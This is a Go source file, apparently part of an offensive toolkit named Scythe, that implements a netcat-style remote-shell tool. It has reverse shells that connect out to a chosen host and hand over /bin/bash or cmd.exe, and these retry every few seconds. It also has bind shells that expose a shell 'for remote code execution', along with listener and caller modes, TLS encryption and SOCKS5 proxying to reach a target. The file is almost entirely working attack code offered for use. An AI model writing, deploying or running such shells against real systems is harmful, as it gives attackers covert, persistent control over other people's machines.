package netcat

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/BuildAndDestroy/Scythe/pkg/encryption"
	"github.com/BuildAndDestroy/Scythe/pkg/environment"
	"github.com/BuildAndDestroy/Scythe/pkg/proxies"
)

type NetcatInput struct {
	HostAddress string
	Port        int
	Bind        bool
	Reverse     bool
	Caller      bool
	Listener    bool
	Tls         bool
	Proxy       string
}

func (nni *NetcatInput) SetNetcatInput(fs *flag.FlagSet) {
	fs.StringVar(&nni.HostAddress, "address", "127.0.0.1", "Set host address, default is 127.0.0.1")
	fs.IntVar(&nni.Port, "port", 8080, "Provide a port to bind to on this host")
	fs.BoolVar(&nni.Bind, "bind", false, "Set Flag for Bind shell. Note: do not use with --reverse")
	fs.BoolVar(&nni.Caller, "caller", false, "Call to a bind shell.")
	fs.BoolVar(&nni.Reverse, "reverse", false, "Set Flag for a Reverse Shell. Note: do not use with --bind")
	fs.BoolVar(&nni.Listener, "listen", false, "Create a Listener for rev shells.")
	fs.BoolVar(&nni.Tls, "tls", false, "Use encryption for Netcat connection. RECOMMENDED")
	fs.StringVar(&nni.Proxy, "proxy", "", "Use a SOCKS5 proxy between us and target, example 127.0.0.1:9050")
}

func NetcatArgLogic(nni *NetcatInput) {
	var (
		bindAddress = fmt.Sprintf(":%d", nni.Port)
		osRuntime   = *environment.OperatingSystemDetect()
		callAddress = fmt.Sprintf("%s:%d", nni.HostAddress, nni.Port)
	)
	NetcatArgumentExceptions(nni)

	if nni.Bind && !nni.Tls {
		BindLogic(bindAddress, osRuntime)
	}
	if nni.Bind && nni.Tls {
		tlsConfig := encryption.SetupTLSServer()
		TlsBindLogicServer(tlsConfig, bindAddress, osRuntime)
	}
	if nni.Reverse && nni.Tls && nni.Proxy != "" {
		tlsConfig := encryption.SetupTLSClient()
		ProxyTlsReverseLogic(nni.Proxy, callAddress, osRuntime, tlsConfig)
		return
	}
	if nni.Reverse && !nni.Tls && nni.Proxy != "" {
		ProxyReverseLogic(nni.Proxy, callAddress, osRuntime)
		return
	}
	if nni.Reverse && !nni.Tls {
		ReverseLogic(callAddress, osRuntime)
	}
	if nni.Reverse && nni.Tls {
		tlsConfig := encryption.SetupTLSClient()
		TlsReverseLogic(tlsConfig, callAddress, osRuntime)
	}
	if nni.Caller && nni.Tls && nni.Proxy != "" {
		tlsConfig := encryption.SetupTLSClient()
		ProxyTlsBindLogicClient(nni.Proxy, callAddress, tlsConfig)
		return
	}
	if nni.Caller && !nni.Tls && nni.Proxy != "" {
		ProxyCallBindLogic(nni.Proxy, callAddress)
		return
	}
	if nni.Caller && !nni.Tls {
		CallBindLogic(callAddress)
	}
	if nni.Caller && nni.Tls {
		tlsConfig := encryption.SetupTLSClient()
		TlsBindLogicClient(tlsConfig, callAddress)
	}
	if nni.Listener && !nni.Tls {
		OpenListener(bindAddress, osRuntime)
	}
	if nni.Listener && nni.Tls {
		tlsConfig := encryption.SetupTLSServer()
		TlsOpenListener(tlsConfig, bindAddress, osRuntime)
	}
}

func NetcatArgumentExceptions(nni *NetcatInput) {
	if nni.Bind && nni.Reverse && nni.Caller && nni.Listener {
		log.Fatalln("Cannot bind, reverse, call, and listen at the same time.")
	}
	if nni.Bind && nni.Reverse && nni.Listener {
		log.Fatalln("Cannot bind, reverse, and listen at the same time.")
	}
	if nni.Bind && nni.Caller && nni.Listener {
		log.Fatalln("Cannot bind, call, and listen at the same time.")
	}
	if nni.Caller && nni.Reverse && nni.Listener {
		log.Fatalln("Cannot call, reverse, and listen at the same time.")
	}
	if nni.Bind && nni.Reverse {
		log.Fatalln("Cannot bind and reverse at the same time.")
	}
	if nni.Bind && nni.Caller {
		log.Fatalln("Cannot bind and call at the same time.")
	}
	if nni.Reverse && nni.Caller {
		log.Fatalln("Cannot reverse and call at the same time.")
	}
	if nni.Bind && nni.Listener {
		log.Fatalln("Cannot bind and listen at the same time.")
	}
	if nni.Caller && nni.Listener {
		log.Fatalln("Cannot call and listen at the same time.")
	}
	if nni.Reverse && nni.Listener {
		log.Fatalln("Cannot reverse and listen at the same time.")
	}
}

func ProxyReverseLogic(proxyAddress, callAddress, osRuntime string) {
	var tlsBoolean bool = false
	var tlsConfig *tls.Config
	for {
		dialer, err := proxies.DialThroughSOCKS5(proxyAddress, callAddress, tlsConfig, tlsBoolean)
		if err != nil {
			log.Println(err)
			log.Println("[*] Retrying in 5 seconds")
			time.Sleep(5 * time.Second)
			continue
		}
		log.Printf("[*] Rev shell spawning, connecting to %s", callAddress)
		switch osRuntime {
		case "linux":
			RevHandleLinux(dialer)
		case "windows":
			RevHandleWindows(dialer)
		case "darwin":
			RevHandleDarwin(dialer)
		default:
			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
		}
	}
}

func ReverseLogic(callAddress string, osRuntime string) {
	for {
		caller, err := net.Dial("tcp", callAddress)
		if err != nil {
			log.Println(err)
			log.Println("[*] Retrying in 5 seconds")
			time.Sleep(5 * time.Second)
			continue
		}
		log.Printf("[*] Rev shell spawning, connecting to %s", callAddress)
		switch osRuntime {
		case "linux":
			RevHandleLinux(caller)
		case "windows":
			RevHandleWindows(caller)
		case "darwin":
			RevHandleDarwin(caller)
		default:
			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
		}
	}
}

func ProxyTlsReverseLogic(proxyAddress, callAddress, osRuntime string, tlsConfig *tls.Config) {
	// Parse a SOCKS5 connection with TLS wrapper
	// Begin the reverse shell
	var tlsBoolean bool = true
	for {
		dialer, err := proxies.DialThroughSOCKS5(proxyAddress, callAddress, tlsConfig, tlsBoolean)
		if err != nil {
			// log.Fatalln("[-] Failed to establish TLS connection through SOCKS5: %v", err)
			log.Println(err)
			log.Println("[*] Retrying in 5 seconds")
			time.Sleep(5 * time.Second)
			continue
		}
		log.Printf("[*] Rev shell spawning, connecting to %s", callAddress)
		switch osRuntime {
		case "linux":
			RevHandleLinux(dialer)
		case "windows":
			RevHandleWindows(dialer)
		case "darwin":
			RevHandleDarwin(dialer)
		default:
			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
		}
	}
}

func TlsReverseLogic(tlsConfig *tls.Config, callAddress, osRuntime string) {
	for {
		caller, err := tls.Dial("tcp", callAddress, tlsConfig)
		if err != nil {
			log.Println(err)
			log.Println("[*] Retrying in 5 seconds")
			time.Sleep(5 * time.Second)
			continue
		}
		log.Printf("[*] Rev shell spawning, connecting to %s", callAddress)
		switch osRuntime {
		case "linux":
			RevHandleLinux(caller)
		case "windows":
			RevHandleWindows(caller)
		case "darwin":
			RevHandleDarwin(caller)
		default:
			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
		}
	}
}

func BindLogic(bindAddress string, osRuntime string) {
	listener, err := net.Listen("tcp", bindAddress)
	if err != nil {
		log.Fatalf("Unable to bind to port %s", bindAddress)
	}
	defer listener.Close()
	log.Println("[*] Binding shell spawning for remote code execution")
	for {
		conn, err := listener.Accept()
		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
		if err != nil {
			log.Fatalln("Unable to accept connection.")
		}
		switch osRuntime {
		case "linux":
			go SimpleHandleLinux(conn)
		case "windows":
			go SimpleHandleWindows(conn)
		case "darwin":
			go SimpleHandleDarwin(conn)
		default:
			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
		}
	}
}

func TlsBindLogicServer(tlsConfig *tls.Config, bindAddress string, osRuntime string) {
	// Create a TLS listener
	listener, err := tls.Listen("tcp", bindAddress, tlsConfig)
	if err != nil {
		log.Fatalf("server: listen: %s", err)
	}
	defer listener.Close()
	log.Println("[*] Binding shell spawning for remote code execution")
	for {
		conn, err := listener.Accept()
		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
		if err != nil {
			log.Fatalln("Unable to accept connection.")
		}
		switch osRuntime {
		case "linux":
			go SimpleHandleLinux(conn)
		case "windows":
			go SimpleHandleWindows(conn)
		case "darwin":
			go SimpleHandleDarwin(conn)
		default:
			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
		}
	}
}

func ProxyTlsBindLogicClient(proxyAddress, callAddress string, tlsConfig *tls.Config) {
	// Parse a SOCKS5 connection with TLS wrapper
	// Begin the reverse shell
	var tlsBoolean bool = true
	dialer, err := proxies.DialThroughSOCKS5(proxyAddress, callAddress, tlsConfig, tlsBoolean)
	if err != nil {
		log.Fatalf("client: dial: %s\n", err)
	}
	defer dialer.Close()

	log.Printf("[*] Bind shell spawning, connecting to %s", callAddress)

	BindShellCall(dialer)
}

func TlsBindLogicClient(tlsConfig *tls.Config, callAddress string) {

	caller, err := tls.Dial("tcp", callAddress, tlsConfig)
	if err != nil {
		log.Fatalf("client: dial: %s\n", err)
	}
	defer caller.Close()

	log.Printf("[*] Bind shell spawning, connecting to %s", callAddress)

	BindShellCall(caller)
}

func SimpleHandleLinux(conn net.Conn) {
	// Bind Shell
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout
	cmd := exec.Command("/bin/bash", "-i")
	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func SimpleHandleWindows(conn net.Conn) {
	// Bind Shell
	// Explicitly calling cmd.exe for cmd execution
	// so that we can use it for stdin and stdout
	cmd := exec.Command("cmd.exe")
	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func SimpleHandleDarwin(conn net.Conn) {
	// Bind Shell
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func RevHandleLinux(caller net.Conn) {
	log.Println("Linux")
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = caller
	cmd.Stdout = caller
	cmd.Stderr = caller
	cmd.Run()
}

func RevHandleWindows(caller net.Conn) {
	log.Println("Windows")
	cmd := exec.Command("cmd.exe")
	cmd.Stdin = caller
	cmd.Stdout = caller
	cmd.Stderr = caller
	cmd.Run()
}

func RevHandleDarwin(caller net.Conn) {
	log.Println("Darwin")
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = caller
	cmd.Stdout = caller
	cmd.Stderr = caller
	cmd.Run()
}

func ProxyCallBindLogic(proxyAddress, callAddress string) {
	// Route through a SOCKS5 proxy
	// Call to a bind shell
	var tlsBoolean bool = false
	var tlsConfig *tls.Config
	dialer, err := proxies.DialThroughSOCKS5(proxyAddress, callAddress, tlsConfig, tlsBoolean)
	if err != nil {
		log.Fatalln(err)
	}
	defer dialer.Close()

	log.Printf("[*] Bind shell spawning, connecting to %s", callAddress)

	BindShellCall(dialer)
}

func CallBindLogic(callAddress string) {
	caller, err := net.Dial("tcp", callAddress)
	if err != nil {
		log.Fatalln(err)
	}
	defer caller.Close()

	log.Printf("[*] Bind shell spawning, connecting to %s", callAddress)

	BindShellCall(caller)
}

func BindShellCall(caller net.Conn) {
	for {
		reader := bufio.NewReader(os.Stdin)
		text, err := reader.ReadString('\n')
		if err != nil {
			log.Fatalln(err)
		}
		text = strings.TrimSpace(text)
		_, err = io.WriteString(caller, text+"\n")
		if err != nil {
			log.Fatalln(err)
		}
		go io.Copy(os.Stdout, caller)
	}
}

func OpenListener(bindAddress string, osRuntime string) {
	listener, err := net.Listen("tcp", bindAddress)
	if err != nil {
		log.Fatalln(err)
	}
	defer listener.Close()

	log.Printf("Listener opened on %s\n", bindAddress)
	// for {
	conn, err := listener.Accept()
	log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
	if err != nil {
		log.Fatalln("Unable to accept connection.")
	}
	for {
		reader := bufio.NewReader(os.Stdin)
		text, err := reader.ReadString('\n')
		if err != nil {
			log.Fatalln(err)
		}
		text = strings.TrimSpace(text)
		_, err = io.WriteString(conn, text+"\n")
		if err != nil {
			log.Fatalln(err)
		}
		go io.Copy(os.Stdout, conn)
	}
}

func TlsOpenListener(tlsConfig *tls.Config, bindAddress string, osRuntime string) {
	// Create a TLS listener
	listener, err := tls.Listen("tcp", bindAddress, tlsConfig)
	if err != nil {
		log.Fatalf("server: listen: %s", err)
	}
	defer listener.Close()
	log.Printf("Listener opened on %s\n", bindAddress)
	// for {
	conn, err := listener.Accept()
	log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
	if err != nil {
		log.Fatalln("Unable to accept connection.")
	}
	for {
		reader := bufio.NewReader(os.Stdin)
		text, err := reader.ReadString('\n')
		if err != nil {
			log.Fatalln(err)
		}
		text = strings.TrimSpace(text)
		_, err = io.WriteString(conn, text+"\n")
		if err != nil {
			log.Fatalln(err)
		}
		go io.Copy(os.Stdout, conn)
	}
}
